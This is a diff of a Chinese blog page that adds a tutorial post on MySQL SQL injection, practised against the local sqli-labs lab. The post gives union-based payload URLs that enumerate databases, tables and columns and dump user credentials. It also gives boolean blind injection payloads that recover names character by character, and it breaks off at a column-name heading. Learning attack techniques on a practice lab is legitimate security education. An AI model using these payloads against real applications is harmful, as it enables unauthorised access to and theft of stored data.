@@ -88,7 +88,7 @@
 <meta property="og:description" content="本篇基于注入天书的例子进行总结 前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2019/03/10/5c84cc486773d.jpg">
-<meta property="og:updated_time" content="2019-03-10T08:38:28.000Z">
+<meta property="og:updated_time" content="2019-03-11T08:51:49.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于注入天书的mysql注入总结">
 <meta name="twitter:description" content="本篇基于注入天书的例子进行总结 前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。">
@@ -398,6 +398,80 @@
 <p>本篇基于注入天书的例子进行总结</p>
 <p>前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。</p>
 <a id="more"></a>
+<h2 id="基本的联合注入"><a href="#基本的联合注入" class="headerlink" title="基本的联合注入"></a>基本的联合注入</h2><p>information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<p>再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面。</p>
+<p>这里拿sqli第一关来进行实验</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>我们看一下源码里的查询语句 前面单引号我们应该闭合 后面我们可以用–+来注释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1%27order%20by%203--+</span><br></pre></td></tr></table></figure></p>
+<p>接下里思路就比较常规了</p>
+<h3 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+<h3 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),3--+</span><br></pre></td></tr></table></figure>
+<h3 id="查询数据库下的表名"><a href="#查询数据库下的表名" class="headerlink" title="查询数据库下的表名"></a>查询数据库下的表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22security%22--+</span><br></pre></td></tr></table></figure>
+<h3 id="爆user表下的列"><a href="#爆user表下的列" class="headerlink" title="爆user表下的列"></a>爆user表下的列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22--+</span><br></pre></td></tr></table></figure>
+<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(id,username,password),3%20from%20users--+</span><br></pre></td></tr></table></figure>
+<p>Less 1-4都是可以用类似的payload来注出数据的</p>
+<p>唯一不同的是 </p>
+<p>less2对没有对参数进行处理payload 与 less1 中一直，只需要将 less1 中的 ‘ 去掉即可。</p>
+<p>less3对参数进行了’ ‘ （ ）的包装 只需要将 less1 中的 ‘ 添加） 即 ’) 即可</p>
+<p>less4对参数进行了” “（ ）的包装 只需要将 less1 中的 ‘ 改为  “) 即可</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注是在sql语句执行后 数据不能返回到前端页面 不能回显</p>
+<p>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+<p>注入天书上讲盲注也分为三类</p>
+<ul>
+<li>基于布尔的sql盲注</li>
+<li>基于时间的sql盲注</li>
+<li>基于报错的sql盲注</li>
+</ul>
+<h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><p>mid(coulumn_name,start,length)</p>
+<p>​    mid(database(),1,1)&gt;’a’,查看数据库名第一位，</p>
+<p>​    mid(database(),2,1)查看数据库名第二位，依次查看各位字符。</p>
+<p>Substr(a,b,c)参数同mid函数一样</p>
+<p>​    从 b 位置开始，截取字符串 a 的 c 长度。</p>
+<p>​    substr(database()1,1)</p>
+<p>Left()得到字符串左部指定个数的字符</p>
+<p>​    Left ( a, b )        从左侧截取a的前b位。</p>
+<p>​    left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库    名前二位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema</span><br><span class="line">=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数</span><br></pre></td></tr></table></figure>
+<p>截取当前数据库下所有表名的 第一个表的 名字的第一位是否为ascii编码101(ascii编码101为字母e 也就是第一位是否为e)</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>sqli第五关来做实例</p>
+<p>与联合查询有所不同联合查询上来就可以database爆出数据库名</p>
+<p>盲注的话我们应该先猜数据库长度</p>
+<h4 id="数据库的长度"><a href="#数据库的长度" class="headerlink" title="数据库的长度"></a>数据库的长度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20length(database())=8--+</span><br></pre></td></tr></table></figure>
+<p>上面长度为8时界面Ture说明数据库长度为8</p>
+<p>有了长度以后才应该去猜数据库名</p>
+<h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
+<p>判断数据库名的第一位是否等于s(这里把s进行了ascii码转换可以更快且更方便的猜出数据)</p>
+<p>以此类推来猜测数据库名第二位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),2,1))=101--+</span><br></pre></td></tr></table></figure>
+<p>感觉太磨叽 额。。。依次类推猜出数据库名为<code>security</code></p>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>获取表名之前 首先应该知道数据库下表的数量 方便后面来猜表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=4--+</span><br></pre></td></tr></table></figure>
+<p>当前数据库下的表的个数有4个</p>
+<p>步骤应该很清晰</p>
+<p>知道了有4个表接下来 我们来猜一下每个表的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%200,1)=6--+</span><br></pre></td></tr></table></figure>
+<p>等于6时返回正常可知第一个表长度为6</p>
+<p>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那<br>要获取第二个是不是就是 limit 1,1！</p>
+<p>所以获取第二个表的长度为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%201,1)=8--+</span><br></pre></td></tr></table></figure>
+<p>第三个，四个类似</p>
+<p>至此可以获取四个表每个表的长度</p>
+<p>接下来猜第一个表名的第一个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),1,1))=101--+</span><br></pre></td></tr></table></figure>
+<p>第一个表第二个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),2,1))=109--+</span><br></pre></td></tr></table></figure>
+<p>上面提到了<code>limit</code> 所以猜测第二个表的第一个字符的话</p>
+<p><code>limit 1,1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1),1,1))=114--+</span><br></pre></td></tr></table></figure>
+<p>后面依次类推</p>
+<p>到这里我们就获取到了<code>security</code>数据库下 也就是当前数据库下的所有表名</p>
+<ul>
+<li>emails</li>
+<li>referers</li>
+<li>uagents</li>
+<li>users</li>
+</ul>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4>
       
     </div>
     
@@ -487,8 +561,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -600,6 +683,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本的联合注入"><span class="nav-number">1.</span> <span class="nav-text">基本的联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查询所有数据库"><span class="nav-number">1.1.</span> <span class="nav-text">查询所有数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询当前数据库"><span class="nav-number">1.2.</span> <span class="nav-text">查询当前数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询数据库下的表名"><span class="nav-number">1.3.</span> <span class="nav-text">查询数据库下的表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆user表下的列"><span class="nav-number">1.4.</span> <span class="nav-text">爆user表下的列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆数据"><span class="nav-number">1.5.</span> <span class="nav-text">爆数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#盲注"><span class="nav-number">2.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#截取字符串常用函数"><span class="nav-number">2.1.</span> <span class="nav-text">截取字符串常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注"><span class="nav-number">2.2.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库的长度"><span class="nav-number">2.2.1.</span> <span class="nav-text">数据库的长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库名"><span class="nav-number">2.2.2.</span> <span class="nav-text">数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表名"><span class="nav-number">2.2.3.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列名"><span class="nav-number">2.2.4.</span> <span class="nav-text">列名</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
